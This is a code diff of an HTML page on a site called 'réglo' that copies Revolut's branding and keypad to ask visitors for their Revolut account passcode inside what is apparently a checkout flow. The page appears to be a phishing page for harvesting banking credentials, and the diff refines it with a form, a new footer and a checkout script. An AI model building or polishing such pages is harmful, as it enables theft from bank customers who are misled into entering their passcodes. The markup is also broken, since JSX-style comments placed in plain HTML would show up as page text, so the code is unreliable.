@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolut - Passcode</title>
+    <title>Revolut - Passcode | réglo.fr</title> <!-- Updated title -->
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="revolut_theme.css">
 </head>
-<body class="revolut-theme" id="revolut-passcode-page"> <!-- Added ID for consistency -->
-    <!-- Header -->
-    <header class="revolut-header">
-        <div class="revolut-logo">
-            <div class="logo">réglo<span>.</span></div>
+<body class="revolut-theme" id="revolut-passcode-page">
+    <header class="site-header">
+        <div class="container">
+            <div class="logo-area">
+                <a href="index.html" class="logo">réglo<span>.</span></a>
+            </div>
         </div>
     </header>
 
-    <!-- Main Content -->
-    <main class="revolut-container">
+    <main class="revolut-page-content container"> {/* Added main wrapper */}
         <div class="revolut-card">
-            <!-- Logo -->
             <div class="revolut-auth-logo">
                 <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
             </div>
@@ -26,14 +25,15 @@
             <h1 class="revolut-title">Entrez votre passcode</h1>
             <p class="revolut-subtitle">Pour accéder à votre compte Revolut</p>
             
-            <!-- Single Passcode Input -->
-            <div class="revolut-passcode-wrapper">
-                <input type="password" class="revolut-passcode-input" id="passcodeInput" autocomplete="off" placeholder="Tapez votre passcode">
-            </div>
-            
-            <a href="#" class="revolut-passcode-link">Passcode oublié ?</a>
-            
-            <!-- Keypad -->
+            {/* Form structure for passcode. JS handles keypad interaction and submission. */}
+            <form id="revolut-passcode-form" action="javascript:void(0);"> 
+                <div class="revolut-passcode-input-container">
+                    <input type="password" class="revolut-passcode-input" id="revolut-passcode" autocomplete="off" placeholder="••••" inputmode="numeric" maxlength="4" required readonly> {/* Readonly as keypad fills it */}
+                </div>
+                <a href="#" class="revolut-passcode-forgot revolut-link">Passcode oublié ?</a>
+                {/* Keypad is visually part of this, but submit is handled by JS listening to keypad's OK */}
+            </form>
+
             <div class="revolut-keypad">
                 <div class="revolut-key" data-key="1">1</div>
                 <div class="revolut-key" data-key="2">2</div>
@@ -46,14 +46,26 @@
                 <div class="revolut-key" data-key="9">9</div>
                 <div class="revolut-key revolut-key-special" id="clearKey">Effacer</div>
                 <div class="revolut-key" data-key="0">0</div>
-                <div class="revolut-key revolut-key-special" id="submitKey">OK</div>
+                <div class="revolut-key revolut-key-special" id="submitKey">OK</div> {/* This button's click is handled by JS */}
             </div>
         </div>
     </main>
 
-    <!-- Footer -->
-    <footer class="revolut-footer">
-        <p>Vérification en cours<span id="revolutLoadingDots"></span></p>
+    <footer class="site-footer-v2">
+        <div class="container">
+            <div class="footer-columns">
+                 <div class="footer-column">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="javascript:void(0);" class="legal-link" data-type="terms">CGV</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom-v2">
+                <p>&copy; 2024 réglo. Tous droits réservés.</p>
+            </div>
+        </div>
     </footer>
 
     <script src="checkout_flow.js" defer></script>
